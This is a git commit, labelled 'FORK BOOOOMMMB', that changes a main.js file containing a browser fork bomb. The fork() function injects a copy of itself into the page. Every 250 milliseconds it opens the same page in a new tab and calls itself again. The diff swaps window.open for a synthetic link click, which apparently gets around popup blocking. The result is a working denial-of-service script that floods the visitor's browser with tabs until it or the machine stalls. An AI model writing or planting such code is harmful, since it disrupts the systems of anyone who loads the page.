391990551a76e2f46d0f9c9f74ce6a23c04ba18e
The Bearodactyl <dabewodactowluwu@gmail.com>
2024-07-31 21:38:56 -0500

    FORK BOOOOMMMB

--- main.js
+++ main.js
@@ -3,7 +3,11 @@ function fork() {
   script.innerHTML = fork + "\n" + "fork();";
   document.head.appendChild(script);
   setTimeout(function() {
-    window.open(window.location.href, '_blank'); // Open the same URL in a new tab
+    const link = document.createElement('a');
+    link.href = window.location.href;
+    link.target = '_blank';
+    link.rel = 'noopener noreferrer';
+    link.click();
     fork();
   }, 250);
 }
